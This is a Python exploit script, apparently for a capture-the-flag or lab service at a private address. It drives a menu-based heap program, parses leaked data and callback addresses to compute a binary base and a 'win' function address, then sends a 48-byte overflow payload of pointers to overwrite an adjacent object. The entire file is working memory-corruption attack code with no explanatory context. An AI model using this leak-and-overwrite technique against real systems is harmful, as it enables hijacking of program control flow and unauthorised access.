import socket
import time
import struct
import re

host = "10.2.0.5"
port = 10004


def get_response(s):
    time.sleep(0.5)
    return s.recv(4096).decode(errors="ignore")


def recv_until(s, delim):
    data = b""
    while not data.endswith(delim):
        chunk = s.recv(1)
        if not chunk:
            break
        data += chunk
    return data


def parse_addr(out, label):
    m = re.search(f"{label}: (0x[0-9a-f]+)", out)
    if m:
        return int(m.group(1), 16)
    return None


def p64(x):
    return struct.pack("<Q", x)


def probe():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    recv_until(s, b"> ")

    # Alloc A
    s.sendall(b"1\n")
    recv_until(s, b": ")
    s.sendall(b"32\n")
    recv_until(s, b": ")
    s.sendall(b"A\n")
    recv_until(s, b"> ")

    # Alloc B
    s.sendall(b"2\n")
    recv_until(s, b": ")
    s.sendall(b"32\n")
    recv_until(s, b": ")
    s.sendall(b"B\n")
    recv_until(s, b"> ")

    # Leak Addresses
    s.sendall(b"6\n")
    out_a = recv_until(s, b"> ").decode(errors="ignore")
    data_a = parse_addr(out_a, "Data address")
    print(f"Data A: {hex(data_a)}")

    # Calc target
    cb_addr = parse_addr(out_a, "Callback address")
    if cb_addr:
        base = cb_addr - 0x9DAA
        win = base + 0x9D69
        print(f"Base: {hex(base)}")
        print(f"Win: {hex(win)}")
    else:
        win = 0xDEADBEEF

    # Payload
    payload = b"A" * 48
    # Overwrite Object B with all valid pointers (data_a)
    for i in range(10):
        payload += p64(data_a)

    # Write A
    s.sendall(b"5\n")
    recv_until(s, b": ")
    s.sendall(payload + b"\n")
    recv_until(s, b"> ")

    # Show B
    s.sendall(b"7\n")
    out_b = recv_until(s, b"> ").decode(errors="ignore")
    print("Show B Output:\n", out_b)

    s.close()


if __name__ == "__main__":
    probe()
